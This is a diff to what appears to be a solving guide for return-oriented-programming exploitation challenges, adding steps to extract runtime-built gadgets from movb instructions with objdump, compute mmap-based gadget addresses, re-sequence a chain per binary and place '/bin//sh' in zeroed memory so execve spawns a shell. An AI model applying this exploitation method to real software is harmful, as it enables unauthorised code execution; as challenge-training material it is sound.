@@ -592,18 +592,49 @@ objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|mov
 
 **If `mmap` + `movb` appear → binary builds its own gadgets at runtime:**
 1. Gadgets do NOT exist in the static binary — do not run find_gadgets.py
-2. Read the movb instructions in main() in offset order:
+2. Extract movb bytes:
    ```bash
    objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep "movb.*0x"
    ```
-3. Each group of 3 bytes = one gadget. Decode using the byte table below.
-4. Calculate gadget_base:
-   ```python
-   mmap_base    = (hardcoded_addr // 0x1000 - 0x1000) * 0x1000
-   gadget_base  = mmap_base + TEMP_value   # TEMP=1000 → +0x3e8
-   gadget_addr  = gadget_base + byte_offset_in_table
+   Output looks like:
    ```
-5. Use `mmap_base + 0x500` as writable address — NEVER .bss when mmap is present
+    8049123:  c6 45 e8 58    movb   $0x58,-0x18(%ebp)
+    8049127:  c6 45 e9 5b    movb   $0x5b,-0x17(%ebp)
+    804912b:  c6 45 ea c3    movb   $0xc3,-0x16(%ebp)
+   ```
+   Read the `$0xNN` value from each line in order: `58 5b c3` = gadget 0.
+   Every 3 bytes = one gadget. First 2 bytes = instruction, `c3` = ret.
+
+3. Decode each 3-byte group using the byte reference table in Section C below.
+
+4. Find hardcoded_addr (look for address pushed before `call mmap` in main()):
+   ```bash
+   objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -B5 "mmap"
+   ```
+
+5. Calculate gadget_base:
+   ```python
+   mmap_base   = (hardcoded_addr // 0x1000 - 0x1000) * 0x1000
+   gadget_base = mmap_base + 1000   # TEMP=1000, offset = TEMP value directly
+   # each gadget: gadget_base + byte_offset (+0x00, +0x03, +0x06, +0x09...)
+   ```
+
+6. **Chain re-sequencing:** gadget byte order DIFFERS between binaries in the same set.
+   After decoding YOUR binary's movb table, map each gadget to its offset:
+   ```python
+   gb = gadget_base
+   G_POP_EAX_POP_EBX = gb + 0x??   # fill in from YOUR decoded table
+   G_MOV_EBXPTR_EAX  = gb + 0x??
+   # etc — NEVER copy offsets from another binary
+   ```
+   Then plug into solve_rop_template.py — chain structure never changes, only addresses.
+
+7. **init_data() null terminator problem:**
+   Some binaries fill `.bss` with `0xffffffff` before main(). "/bin//sh" needs null at +8.
+   If `.bss+8 = 0xffffffff` → execve returns ENOENT silently. No output, no error.
+   **Fix: always use `mmap_base + 0x500` — MAP_ANONYMOUS zeroes it → guaranteed null.**
+
+8. Use `mmap_base + 0x500` as writable address — NEVER .bss when mmap is present.
 
 **If no mmap/movb → gadgets are static, proceed normally below.**
 
